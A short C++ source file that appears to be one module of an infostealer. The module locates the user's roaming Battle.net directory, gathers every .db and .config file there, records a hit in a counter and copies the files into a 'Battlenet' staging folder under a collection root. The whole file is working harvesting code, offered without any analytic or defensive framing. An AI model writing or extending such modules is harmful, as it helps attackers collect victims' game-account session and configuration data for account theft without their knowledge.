//
// Created by .1qxz on 08.06.2024.
//

#include "BattleNet.h"

static const fs::path BATTLE_NET_PATH = Utils::getRoamingPath() / "Battle.net";

void BattleNet::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(BATTLE_NET_PATH, [](const fs::path &path) {
        std::string extension = path.extension().string();
        extension.erase(0, 1);

        return extension == "db" || extension == "config";
    });

    if(paths.empty())
        return;

    Counter::setBattlenet();

    fs::path dst = root / "Battlenet";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}
